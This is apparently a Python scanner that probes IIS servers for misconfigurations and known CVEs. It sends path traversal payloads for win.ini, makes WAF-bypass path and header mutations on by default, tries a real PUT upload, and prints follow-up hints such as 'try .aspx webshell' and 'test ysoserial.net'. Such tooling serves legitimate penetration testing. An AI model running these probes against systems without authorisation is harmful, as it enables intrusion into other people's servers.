#!/usr/bin/env python3
# iis-scan.py — IIS misconfig + known CVE checks (non-destructive)
import sys, os, re, argparse, requests
from urllib.parse import urljoin, urlparse
from datetime import datetime

requests.packages.urllib3.disable_warnings()
T = 10
H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Accept": "*/*"}
c = lambda t, n: f"\033[{n}m{t}\033[0m"
G = lambda t: c(t, 32); Y = lambda t: c(t, 33); R = lambda t: c(t, 31); C = lambda t: c(t, 36)

V = True
B = True

HIGH = ("trace.axd", "elmah.axd", "web.config")

def bget(s, url, method="GET", **kw):
    """probe once; on 403 (or 404 for high-value paths, with --bypass) try mutations."""
    p = urlparse(url); pa = p.path or "/"
    r = rq(s, url, method, **kw)
    if r is None: return None, None
    if r.status_code == 404 and not pa.lower().endswith(HIGH): return None, None
    if r.status_code not in (403, 404): return r, url
    if not B: return None, None
    for mp in (pa.swapcase(), pa + ";", pa + "%00", pa + "%20", pa + ".",
               "//" + pa.lstrip("/"), "/./" + pa.lstrip("/")):
        u = url.replace(pa, mp, 1)
        m = rq(s, u, method, **kw)
        if m is not None and m.status_code < 400:
            return m, u
    for h in ({"X-Original-URL": pa}, {"X-Rewrite-URL": pa}):  # ARR / reverse proxies
        m = rq(s, url, method, headers=h, **kw)
        if m is not None and m.status_code < 400:
            return m, url + " [" + list(h)[0] + "]"
    return None, None

def rq(s, url, method="GET", **kw):
    try:
        kw.setdefault("timeout", T); kw.setdefault("verify", False)
        r = s.request(method, url, **kw)
        if V: print(f"    {c(str(r.status_code), 90)} {method} {url}")
        return r
    except Exception as e:
        if V: print(f"    {c('ERR', 31)} {method} {url} ({type(e).__name__})")
        return None

def txt(r):
    try: return r.text
    except Exception: return ""

def iis_ver(server):
    m = re.search(r'microsoft-iis/([\d.]+)|iis[ /]([\d.]+)', server)
    return (m.group(1) or m.group(2)) if m else None

def check(base, s):
    res = []
    p = urlparse(base)
    if not p.scheme or not p.netloc:
        print(f" {R('[Invalid URL]')} {base!r}"); return
    if V: print(f"\n{C('→ Scanning')} {base}")
    r = rq(s, base)
    if r is None:
        print(f" {R('[No response]')} {base}"); return
    server = r.headers.get("Server", "")
    sl = server.lower()
    ver = iis_ver(sl)

    if ver: res.append(f"{G('[IIS detected]')} {server}")
    elif "httpapi" in sl: res.append(f"{G('[IIS detected]')} {server}")
    else: res.append(f"{Y('[Not IIS? Server: ' + (server or 'hidden') + ']')}")
    if r.headers.get("X-AspNet-Version"): res.append(f"{Y('[ASP.NET version disclosed]')} {r.headers['X-AspNet-Version']}")
    if r.headers.get("X-AspNetMvc-Version"): res.append(f"{Y('[ASP.NET MVC version disclosed]')} {r.headers['X-AspNetMvc-Version']}")

    # CVE-2017-7269 — IIS 6.0 WebDAV ScStoragePathFromUrl RCE
    o = rq(s, base, "OPTIONS")
    allow = o.headers.get("Allow", "").upper() if o else ""
    dav = ((o.headers.get("DAV", "") + o.headers.get("MS-Author-Via", "")).upper() if o else "")
    if ver and ver.startswith("6.") and ("PROPFIND" in allow or "DAV" in dav):
        res.append(f"{R('[CVE-2017-7269 likely]')} IIS 6.0 + WebDAV PROPFIND enabled")

    # CVE-2015-1635 / MS15-034 — HTTP.SYS (safe probe: max Range, no crash variant)
    hr = rq(s, base, headers={"Range": "bytes=0-18446744073709551615"})
    if hr is not None and hr.status_code == 416 and "requested range not satisfiable" in txt(hr).lower():
        res.append(f"{R('[CVE-2015-1635 likely]')} HTTP.SYS 416 on max Range")

    # MS10-070 — ASP.NET padding oracle
    for h in ("WebResource.axd", "ScriptResource.axd"):
        pr = rq(s, urljoin(base, h + "?d=AAAA"))
        if pr is not None and pr.status_code == 500:
            res.append(f"{R('[MS10-070 padding oracle likely]')} {h}?d= invalid ciphertext -> 500")
            break

    # trace.axd remote (with bypass mutations when --bypass)
    tr, tu = bget(s, urljoin(base, "trace.axd"))
    if tr is not None and tr.status_code == 200 and "prevent trace.axd from being viewed remotely" not in txt(tr).lower():
        res.append(f"{R('[trace.axd remotely accessible]')} {tu}")

    # elmah.axd error log exposure
    er, eu = bget(s, urljoin(base, "elmah.axd"))
    if er is not None and er.status_code == 200 and any(k in txt(er).lower() for k in ("error log", "elmah", "sequence of events")):
        res.append(f"{R('[elmah.axd exposed]')} {eu}")

    # Dangerous methods / WebDAV + real PUT upload test
    if o is not None:
        f = [m for m in ("PUT", "DELETE", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE") if m in allow]
        if f: res.append(f"{R('[Dangerous HTTP methods]')} {', '.join(f)}")
        if "DAV" in dav: res.append(f"{R('[WebDAV enabled]')}")
    putname = f"iisprobe-{os.urandom(4).hex()}.txt"
    pu = rq(s, urljoin(base, putname), "PUT", data="pentest-probe")
    if pu is not None and pu.status_code in (200, 201):
        res.append(f"{R('[PUT upload works]')} {urljoin(base, putname)} ({pu.status_code}) — try .aspx webshell")
        rq(s, urljoin(base, putname), "DELETE")  # cleanup

    # TRACE / TRACK XST
    xst = rq(s, base, "TRACE")
    if xst is not None and xst.status_code == 200 and "trace" in txt(xst).lower():
        res.append(f"{Y('[TRACE enabled]')} cross-site tracing possible")

    # web.config disclosure + backup/bypass variants
    for v in (["/web.config", "/web.config.bak", "/web.config.old", "/web.config.txt",
              "/web.config~", "/web.config%20", "/web.config.", "/web.config::$DATA",
              "/Web.config", "/WEB.CONFIG"]):
        wc, wu = bget(s, urljoin(base, v))
        if wc is not None and wc.status_code == 200 and "<configuration" in txt(wc):
            res.append(f"{R('[web.config readable]')} {wu} — check machineKey/connectionStrings")
            break

    # Default IIS pages
    for path in ("/iisstart.htm", "/welcome.png", "/aspnet_client/"):
        d = rq(s, urljoin(base, path))
        if d is not None and d.status_code == 200 and any(k in txt(d).lower() for k in ("iis", "internet information services", "under construction")):
            res.append(f"{Y('[Default IIS page]')} {path}")

    # Directory listing
    for path in ("/", "/test/", "/upload/", "/backup/"):
        d = rq(s, urljoin(base, path))
        if d is not None and d.status_code == 200 and any(k in txt(d).lower() for k in ("index of /", "directory listing denied", "<h1>directory")):
            res.append(f"{R('[Directory listing]')} {path}")

    # IIS 8.3 shortname (tilde) — 404-vs-400 differential
    a = rq(s, urljoin(base, "a1b2c3~1/.aspx"))
    b = rq(s, urljoin(base, "a1b2c3zz/.aspx"))
    if a is not None and b is not None and a.status_code != b.status_code and 400 in (a.status_code, b.status_code):
        res.append(f"{Y('[8.3 shortname disclosure]')} ~1 oracle: {a.status_code} vs {b.status_code}")

    # Verbose ASP.NET errors (exclude stock IIS 404 page)
    e = rq(s, urljoin(base, "/nonexistent-3141592654.aspx"))
    et = txt(e).lower() if e is not None else ""
    stock = "404 - file or directory not found" in et or "inetmgr" in et
    strong = ("server error in '/' application", "stack trace", "viewstate", "machinekey",
              "asp.net version", ".net framework version", "compilation debug=")
    if e is not None and e.status_code in (500, 404) and not stock and any(k in et for k in strong):
        res.append(f"{Y('[Verbose ASP.NET errors]')} ({[k for k in strong if k in et][0]})")

    # ViewState MAC validation (garbage value: MAC-enabled errors, disabled attempts deser)
    if "__VIEWSTATE" in txt(r):
        vs = rq(s, base, "POST", data={"__VIEWSTATE": "garbage-invalid-payload"})
        vt = txt(vs).lower() if vs else ""
        if vs is not None and vs.status_code == 200 and "mac" not in vt and "viewstate" not in vt:
            res.append(f"{R('[ViewState MAC possibly disabled]')} garbage ViewState accepted — test ysoserial.net")
        elif "validation of viewstate mac failed" in vt or "mac" in vt:
            res.append(f"{G('[ViewState MAC enabled]')}")

    # Path traversal win.ini
    for t in ("../../../windows/win.ini", "..\\..\\..\\windows\\win.ini", "/%5c..%5c..%5cwindows%5cwin.ini"):
        tv = rq(s, base.rstrip("/") + "/" + t.lstrip("/"))
        if tv is not None and tv.status_code == 200 and any(k in txt(tv) for k in ("[extensions]", "for 16-bit", "mci extensions")):
            res.append(f"{R('[Path traversal — win.ini readable]')} {t}")
            break

    if res:
        print(f"\n{C('→ Findings on')} {base}")
        print("\n".join(f"  {l}" for l in res))
    return res

def main():
    a = argparse.ArgumentParser(
        description="IIS misconfiguration + known CVE checks (non-destructive).",
        epilog="""examples:
  iis-scan.py targets.txt                one URL per line
  iis-scan.py https://10.0.0.1           single URL
  iis-scan.py targets.txt -v             show clean hosts too
  iis-scan.py targets.txt --no-bypass   disable WAF-bypass mutations (on by default)
""",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    a.add_argument("target", metavar="targets.txt|url", help="file of URLs or a single URL")
    a.add_argument("-v", "--verbose", action="store_true", help="also show hosts with no findings")
    a.add_argument("-q", "--quiet", action="store_true", help="hide per-probe output, findings only")
    a.add_argument("--bypass", dest="bypass", action="store_true", default=True, help=argparse.SUPPRESS)
    a.add_argument("--no-bypass", dest="bypass", action="store_false", help="disable WAF-bypass mutations on 403s")
    a.add_argument("-t", "--timeout", type=int, default=10, metavar="S", help="request timeout (default: 10)")
    x = a.parse_args()
    globals()["T"] = x.timeout
    globals()["V"] = not x.quiet
    globals()["B"] = x.bypass

    ansi = re.compile(r'\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    urls = []
    if os.path.isfile(x.target):
        for line in open(x.target, encoding="utf-8", errors="replace"):
            u = ansi.sub("", line).strip()
            if not u or u.startswith(("#", "//")): continue
            if not u.startswith(("http://", "https://")): u = "http://" + u
            urls.append(u)
    else:
        urls.append(x.target if x.target.startswith(("http://", "https://")) else "http://" + x.target)
    if not urls:
        print(f"{R('No valid URLs.')}"); sys.exit(1)

    print(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {len(urls)} target(s)")
    s = requests.Session(); s.headers.update(H)
    total = 0
    for u in urls:
        r = check(u, s)
        if r: total += 1
        elif x.verbose: print(f"\n{C('→')} {u}\n  {G('[clean]')}")
    print(f"\n[{datetime.now():%Y-%m-%d %H:%M:%S}] done — findings on {total}/{len(urls)} host(s)")

if __name__ == "__main__":
    main()
